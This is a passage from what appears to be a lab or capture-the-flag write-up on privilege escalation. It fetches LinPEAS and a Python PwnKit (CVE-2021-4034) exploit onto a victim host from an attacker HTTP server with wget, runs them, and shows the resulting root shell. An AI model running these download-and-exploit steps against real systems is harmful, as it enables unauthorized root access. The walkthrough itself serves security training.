3. Privilege Escalation
3.1 Local Enumeration
We transfer and run LinPEAS to identify privilege escalation vectors.

bash
# On Kali
python3 -m http.server 8000

# On victim
cd /tmp
wget http://192.168.145.49:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.out
3.2 Key Findings from LinPEAS
Kernel: 4.4.0-190-generic (Ubuntu 16.04.7 LTS)

SUID Binary: /usr/bin/pkexec (version 0.105) flagged as vulnerable to CVE-2021-4034 (PwnKit)

Writable directories: /incidents, /recipe.txt in root

No compiler (gcc) installed on target

The output confirms that the pkexec binary is SUID and the system is unpatched for PwnKit.

3.3 Exploiting CVE-2021-4034 without GCC
Since gcc is missing, we use a pure Python3 implementation of the exploit.

We download CVE-2021-4034 Python exploit and transfer it to the victim.

bash
# On Kali
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
python3 -m http.server 8000

# On victim
cd /tmp
wget http://192.168.145.49:8000/CVE-2021-4034.py
python3 CVE-2021-4034.py
Result:

text
[+] Creating shared library for exploit code.
[+] Calling execve()
# whoami
root
We now have a root shell!

